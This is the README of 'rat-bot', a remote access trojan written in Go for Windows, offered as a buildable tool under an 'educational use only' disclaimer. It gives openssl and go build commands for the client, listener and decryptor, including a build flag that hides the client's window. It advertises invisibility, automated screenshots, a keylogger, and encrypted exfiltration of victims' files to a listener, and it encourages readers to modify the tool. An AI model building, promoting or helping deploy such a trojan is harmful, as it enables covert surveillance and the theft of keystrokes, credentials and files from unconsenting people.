# rat-bot
Remote Access Trojan in Go. (For Educational use only!!)

# How to build
- Generate Self Signed Certificates using openssl, by typing the following command:
$openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -sha256 -days 365
- Replace the certificates included in the tls/sever.go and tls/client/Update.go with the ones you generated.

- For the client, Navigate to tls/client or notls/client and
- Run the following command: 
$go build -ldflags -H=windowsgui Update.go

- For the listener, Navigate to tls/ or notls/ and
- Run the following command: 
$go build server.go

- For decrypting the files, navigate to /Encrypt and Decrypt/ and
- Run the following command: 
$go build decrypt.go

# Features
1. Invisibility
2. Automated Screenshot capturing
3. Keylogger
4. Automated functionality which ensures minimal to no listener interaction
5. Compression of exfiltrated files
6. AES encryption of exfiltrated files
7. TLS implementation using self signed certificates (for extra security)
8. One decryptor for all files that are received on the listener end
9. individual functionality included in separate files

# Limitations
- Client endpoint works on Windows platform only

# Note
- This software is not comprehensive. Most of its features can be customized. Encouragement is given to modify and experiment
with the features provided. Different port numbers, AES keys, tls certificates can be used.

# Disclaimer
rat-bot is for education/research purposes only. The author takes NO responsibility and/or liability for how you choose to use any of the tools/source code/any files provided. The author and anyone affiliated with will not be liable for any losses and/or damages in connection with the use of ANY files provided with rat-bot. By using rat-bot or any files included, you understand that you are AGREEING TO USE AT YOUR OWN RISK.
Once again rar-bot and ALL files included are for EDUCATION and/or RESEARCH purposes ONLY. rat-bot is ONLY intended to be used on your own pentesting labs, or with explicit consent from the owner of the property being tested.
